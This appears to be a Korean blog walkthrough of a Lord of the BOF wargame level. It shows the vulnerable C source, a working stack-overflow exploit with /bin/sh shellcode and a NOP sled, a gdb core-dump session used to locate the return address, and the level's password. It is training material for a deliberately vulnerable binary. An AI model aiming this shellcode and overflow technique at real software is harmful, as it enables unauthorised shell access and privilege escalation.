---
title: "BOF - Lv.4 goblin"
excerpt: "Lv.4. goblin"
toc: true
toc_sticky: true
categories:
  - BOF
tags:
  - stack buffer overflow
---

## 1. Source Code
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter    --> 환경변수를 제거함.
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

## 2. Vulnerability
환경변수 대신에 ret 영역 이후의 부분을 이용할 거임.

## 3. Solution
컴파일해서 따로 test 실행파일을 만들어놓고 해본 뒤에 실제파일에 할꺼임.
```
 ./test `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
``` 
그러면 core dump가 되면서 core파일이 생성이 됨. gdb -q -c core로 core파일 확인. 값이 들어간 주소와 값이 잘 들어갔는지 확인하고 잘 들어갔으면 실제파일에 공격.  
```
Core was generated by `./test AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
(gdb) x/150wx $esp
0xbffffa90:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffaa0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffab0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffac0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffad0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffae0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffaf0:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
0xbffffb00:     0x50e3896e      0x89e18953      0xcd0bb0c2      0xbfff0080
0xbffffb10:     0xbfffff3d      0xbfffff45      0xbfffff56      0xbfffff60
0xbffffb20:     0xbfffff6e      0xbfffff7f      0xbfffff8d      0xbfffff98
0xbffffb30:     0xbfffffaa      0xbfffffec      0x00000000      0x00000003
0xbffffb40:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffb50:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffb60:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffb70:     0x08048450      0x0000000b      0x000001f7      0x0000000c
0xbffffb80:     0x000001f7      0x0000000d      0x000001f7      0x0000000e
0xbffffb90:     0x000001f7      0x00000010      0x0f8bfbff      0x0000000f
0xbffffba0:     0xbffffbc1      0x00000000      0x00000000      0x00000000
0xbffffbb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbc0:     0x38366900      0x2f2e0036      0x74736574      0x41414100
0xbffffbd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffbe0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffbf0:     0x41414141      0x41414141      0xbfbfbf41      0x909090bf
0xbffffc00:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc10:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc20:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc30:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc40:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc50:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc60:     0x50c03190      0x732f2f68      0x622f6868      0xe3896e69
0xbffffc70:     0xe1895350      0x0bb0c289      0x000080cd      0x00000000
0xbffffc80:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc90:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffca0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffcd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffce0:     0x00000000      0x00000000
```  
값이 잘 들어갔으므로 실제파일로 공격.  
```
./orc `python -c 'print "A"*44+"\x90\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

my-pass : cantata